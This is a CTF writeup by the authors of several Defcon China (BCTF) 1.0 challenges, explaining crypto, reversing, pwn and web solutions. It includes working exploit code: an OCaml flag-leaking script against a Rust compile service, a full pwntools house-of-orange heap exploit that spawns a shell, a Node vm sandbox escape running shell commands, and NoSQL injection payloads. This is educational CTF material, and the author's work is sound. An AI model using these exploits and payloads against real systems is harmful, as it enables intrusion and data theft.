# Defcon China CTF(BCTF) 1.0 Writeup

Happy Children's Day, hackers! I know you all hacked the time, so you may stay young forever, haha.

Anyway, thanks for participating BCTF. It's a tough task to keep all the challenges as good as possible in such a short time. As we are not the only one writing challenges, here is the list of challenges that from our hands. Other challenges will not be covered in this writeup, as it's not our work. Really hope you guys enjoyed the challenges, and please do contact us if you have anything to complain about the challenges.



Challenges from us include:

trispl, ruscas, echos, myheart, snake, lut, lut revenge, speedapp1, speedapp2 and router.
 - [Defcon China CTF(BCTF)](#defcon-china-ctfbctf)
   - [Challenge Writeup](#challenge-writeup)
     - [trispl](#trispl)
     - [Ruscas](#ruscas)
     - [echos](#echos)
       - [1. program info](#1-program-info)
       - [2. bug](#2-bug)
       - [3. exploit](#3-exploit)
     - [myheart](#myheart)
     - [Snake](#snake)
     - [lut](#lut)
     - [lut revenge](#lut-revenge)
     - [speedapp1](#speedapp1)
     - [speedapp2](#speedapp2)
     - [router](#router)

## Challenge Writeup
### trispl

Fast correlation attack based on LFSR sampling is investigated. The geffe generator is used to carry out fast correlation attacks, but all three LFSRs are sampled. Firstly, you need to do a fast correlation attack to establish the equation. Secondly, the sampling sequence is need to be reversed to the original sequence.The chaotic sequence established by fast correlation attack is related to the first and third sampling sequence respectively. All three LFSRs use primitive polynomials, which are not decomposable and can not use decomposition attack. After fast correlation attack, we use anti-sampling to find the initial state, which is flag.

### Ruscas

```Rust
//! # Intro
//!
//! Compile using `rustc -O`, report wrong if result is less than 0
//! else all report normal.
//!
//! Core idea is to using internal compiler bug to distinguish between
//! true and false. 
//!
//! # Key Points
//!
//! There are multiple parts that I intended to test the players:
//!
//! - "include_bytes!" macro that can get arbitrary file content at the
//!   compile time
//!
//! - const fn calculation, which the only distinguishable implemented
//!   [arithmetic feature](https://github.com/rust-lang/rust/issues/53718) 
//!   is the "is_negative" and "is_positive" on integer type.
//!
//! - use inline assembly bug to make it possible to be optimized away
//!   without triggering. There's a lot of ICE (internal compiler error)
//!   to trigger, however, not all of them is good enough to handle this
//!   case. For example, the borrow checker bug will panic before the
//!   dead code elimination happens, so it will panic wherever you put it.
//!
//! # Intention
//!
//! Original intention is to "attack the online judge services with Rust".
//! This comes to me as I search throw `Rust` stdlib's documentation and
//! find out "include_*" functions that work at compile time. Most online
//! judge systems can tell you if you program successfully compiles, these
//! functions may allow potential attacking to read arbitrary contents.
//!
//!
//! # Potential Problems
//!
//! There might be potential unintended solutions possible.
//! One that is already encountered and considered is that one can leverage
//! the constant checker to get a different result when compiling.
//!
//! For example, it is possible to make it not compilable given
//! `(FLAG_BYTE as u32 - b'g' as u32) as i32` as if the FLAG_BYTE is `f`,
//! this will cause an overflow in constant which will be prevented by compiler.
//!
//! Since this case will only cause the compiler to fail instead of error,
//! the return value is 1 instead of other minus values. So as a counter measure,
//! I changed the return value check part to be "more than 0x7f (less than 0) or not".
//!
//! Still, I'm not 100 percent sure if there exists any other unintended solutions.
#![feature(const_fn, asm)]

/// This will get one byte out of flag, compare it with different bytes to get
/// the whole flag
const VALUE: i32 = (include_bytes!("./flag")[0] - b'g') as i32;

const fn guess() -> bool {
    VALUE.is_negative() // false
}

extern fn test() {}

fn main() {
    // Use this difference to get to know flag
    if guess() {
        // optimize away
    } else {
        // compiles
        unsafe { asm!("call $0" :: "i"(test) :: "intel"); }
    }
}
```

Complete solution (in Ocaml :P) using binary search:

```OCaml
(* usage: ocaml unix.cma str.cma exp.ml *)
open Unix

let connect_service addr port =
    let inet_addr = (gethostbyname addr).h_addr_list.(0) in
    let sockaddr = ADDR_INET (inet_addr, port) in
    let sock = socket PF_INET SOCK_STREAM 0 in
    connect sock sockaddr;
    let outchan = out_channel_of_descr sock in
    let inchan = in_channel_of_descr sock in
    (inchan, outchan)

let done_regexp = Str.regexp "Done"

(** generate exploit Rust code *)
let gen_exploit_code index ch = 
    Printf.sprintf "#![feature(const_fn, asm)]

const VALUE: i32 = (include_bytes!(\"/flag\")[%d] as i8 - b'\\x%02x' as i8) as i32;

const fn guess() -> bool {
    VALUE.is_negative()
}

extern fn test() {}

fn main() {
    if guess() {
    } else {
        unsafe { asm!(\"call $0\" :: \"i\"(test) :: \"intel\"); }
    }
}
EOF
" index ch

(**
 * check if is less than character ch
 *)
let is_less index ch ~host ~port =
    let pass_hint inchan =
        for i = 1 to 4 do
            input_line inchan |> ignore;
            done in
    let inchan, outchan =
        connect_service host port in
    begin
        pass_hint inchan;
        let code = gen_exploit_code index ch in
        begin
            (* print_endline ("sending: " ^ code); *)
            output_string outchan code;
            flush outchan;
            input_line inchan |> ignore; (* compiling... *)
            let res = input_line inchan in
            begin
                print_endline res;
            if Str.string_match done_regexp res 0 then
                true
            else
                false
            end
        end
    end


(**
 * bruteforce particular index
 *)
let bruteforce index ~host ~port =
    let rec binary_search_bruteforce index left right =
        if left < right then
            begin
                print_endline (Printf.sprintf "left: %d" left);
                print_endline (Printf.sprintf "right: %d" right);
            let mid = (left + right) / 2 + 1 in
            if is_less index mid ~host ~port then
                binary_search_bruteforce index left (mid - 1)
            else
                binary_search_bruteforce index mid right
            end
        else
            right
    in binary_search_bruteforce index 17 127


let rec getflag cur ~host ~port =
    let len = String.length cur in
    begin
    if len < 0x20 then
        bruteforce len ~host ~port |>
        Char.chr |>
        String.make 1 |>
        fun x -> begin
            print_endline ("cur: " ^ cur ^ x);
            getflag (cur ^ x) ~host ~port
        end
    else
        cur
    end

let () =
    print_endline "start";
    getflag "" ~host:"localhost" ~port:50806 |>
        print_endline;
;;
```

### echos

**1. program info**

this challenge is modified base the SUCTF 2018's noend challenge. The detail information of noend is in the Neo God's [blog](https://changochen.github.io/2018-05-28-suctf.html).

In this chanllenge, I add the following code to prevent the noend's solution. 
```
if(s)
{
    int is_main_arena = (*(unsigned long long*)(s-8))&0x4;
    if(is_main_arena != 0)
    {
        exit(0);
    }
}
```

**2. bug**

The bug is still same with the noend. when malloc fail, it can cause arbitrary-address-wrrite-zeo.

**3. exploit**

The leak is easy, and I will skip that part.

when call malloc, when the main_arean region is not enough, it will use mmap to map a region which is  close to the libc library address.

So, we can modify some pointer of the libc library, and let the pointer point to the mmaped region.

I use the `house of orange`, use arbitrary-address-wrrite-zeo to modify  `_IO_list_all` pointer the 2nd and 3rd byte to zero (for example modify `0x7ffff7dd2540` to `0x7ffff7000040`), at `0x7ffff7000040`, we can set a fake `struct _IO_FILE_plus` structure.

the final script:
```python
from pwn import *

context.terminal = ['guake', '-n', os.getcwd(), '-e']
context.log_level = 'debug'
pc='./echos'
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.23.so')

def ru(a):
    p.recvuntil(a)

def sa(a,b):
    p.sendafter(a,b)

def sla(a,b):
    p.sendlineafter(a,b)

def echo(size,content):
    p.sendline(str(size))
    sleep(1)
    p.send(content)
    k=p.recvline()
    return k

def pad(n):
    return '0'*n

def house_of_orange(libc,libc_addr):
    _IO_str_jumps_addr = libc_addr + libc.symbols['sys_sigabbrev'] + 0x1940
    payload = p64(0xfffffffffffffffe) + p64(0x61) + pad(8) + p64(libc_addr + libc.symbols['_IO_list_all']-0x10)
    payload+= p64(2) + p64(3) + pad(8) + p64(libc_addr + libc.search('/bin/sh').next())
    payload+= pad(0x80)
    payload+= p64(0xffffffffffffffff) + pad(0x10) + p64(_IO_str_jumps_addr-0x8)
    payload+= pad(8) + p64(libc_addr + libc.symbols['system'])
    return payload

def hack():
    base = 0x0000555555554000
    echo(0x38,'A'*8)
    echo(0x28,'A'*8)
    echo(0x48,'A'*8)
    echo(0x7f,'A'*8)
    k=echo(0x28,'A'*8)
    leak_value =u64(k[8:16])
    print (hex(leak_value))
    libc_base=leak_value-0x3c4b78
    print 'libc_base:', hex(libc_base)
    size = libc_base&0xfff000-0x1000
    io_list_all = libc.symbols['_IO_list_all']+libc_base
    print 'IO_list_all:', hex(io_list_all)
    pading = ((io_list_all&0xff)+0x10)*'a'

    if (io_list_all&0xffffffffff000000) != (libc_base&0xffffffffff000000):
        print('fail, try again')
        return
    echo(size, pading+house_of_orange(libc, libc_base))

    if size < 0x200000:
        echo(size, pading+house_of_orange(libc, libc_base))

    echo(0x90,'A'*8)
    echo(0x28,'A'*8)
    echo(0x90,'A'*8)
    p.sendline(str(io_list_all+2))
    sleep(1)
    p.sendline(str(io_list_all+3))
    sleep(1)
    print 'io_list_all:', hex(io_list_all)

    p.clean()
    main_arena = libc_base + 0x3c4b20

    p.sendline(str(main_arena+0x70+1)) #unsort bin
    sleep(1)
    p.sendline(str(main_arena+0x70+1)) #unsort bin
    p.interactive()

p = process(pc)
hack()

```

### myheart

Firstly, you need to reverse the binary, and you can find this is a stream cipher. It's similar to toyocrypto, which can be attacked by the algebraic attack. There is an easy OOB-read vulnerability to leak the plaintext. You can xor the plaintext and the ciphertext to get the lfsr's output. From an option, you can get enough output to finish the algebraic attack. But it's important to note that, we modified the S10*S23*S32*S42 to S11*S22*S33*S53. So the new annihilation is needed.

### Snake

This is a gameboy re challenge. We can get the gameboy rom from the browser when we access the game website. 

We can easily find out that this game is the classic Snake. How can we get the flag then? We have to reverse  engineer the game of course. Load it into ida32 and set the processor to z80 then we can see the assembly.

From the code we can see that there is a variable controlling whether to display "GAME OVER" or "FLAG IS".After locating where it is used, we can easily locate the memory that saves the flag and how it is generated. Play it and get the flag.

You can check out many amazing resources about gameboy at <https://github.com/gbdev/awesome-gbdev>

### lut

todo

### lut revenge 

todo

### speedapp1

Speedapp is an android app that only provides login and simple calculation functions. The main feature is that it works on the spdy protocol. My design is inspired by a realistic application with spdy protocol for some core endpoints. So When analyzing this app, how to reuse its spdy protocol is a key technology point.

We put two flags in this challenge. If you implement the spdy protocol, combine with the OSS information leak, you can easily get the first flag.

According to `strings.xml` in the apk,   you can get some alibaba cloud object storage service info if you have a sharp nose.  Owning AccessKey, and endpoint(area) to download leak info(source code) by osscmd.

Next point is to overcome communication with server. you can't use tools such as browser, python requests, curl, burpsuite etc, because they dosen't support spdy protocol.  

Reverse analysis and google search is a good way to find out this app is using spdy protocol by java okhttp library. Latest okhttp3.x no longer supports the spdy3.1 protocol,  you have to find a okhttp version that supports the spdy protocol. 

Okhttp2 is okay, but still comes up some exceptions. You need to patch sth, and then communicate with server successfully. Request to `/api/there_is_The_F14g` , and get flag1🚩.

> You can also use other libraries, but may not do well.

### speedapp2

This part is normal and interesting web challenge. Just review the code, and you will find the following problems. 
- Blind nosql injection to get admin username.
- Fake jwt authentication based on username and leaked token.
- Node vm library escape to RCE.

The last two is easily to exploit if you debug and test it locally, so the first and important one is to privilege by sql injection. Intended solution is to blind sql injection in `/api/user/login` to get username. In addition, you should send request post params with **sign**. The sign algorithm is in so file of apk, which is not difficult to reverse.

When exploiting sql injection, there exists an interesting point is that sign with sqli payload. Due to source code, you must regard received params as string when signing. However, sqli payload is parsed as a json object, like this format, `{"username": {"$regex": "%s"}, xxxx`. So you should sign this with `[object Object]` string. Unfortunately, it appears an unintended solution is that easy sql injection in jwt decryption to auth successfully,  like this, `username: { '$gt': '' }`. 

After bypass authentication, you can use calc function, which implemented by node vm library. It is unsafe sandbox, and you can easily construct payload to RCE. There is one example.
```plain
this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('ls /').toString()
```
Then enjoy flag2🚩. 

### router

And for the challenge "router", for the reason that we all know, writeup and exploit maybe not be available.
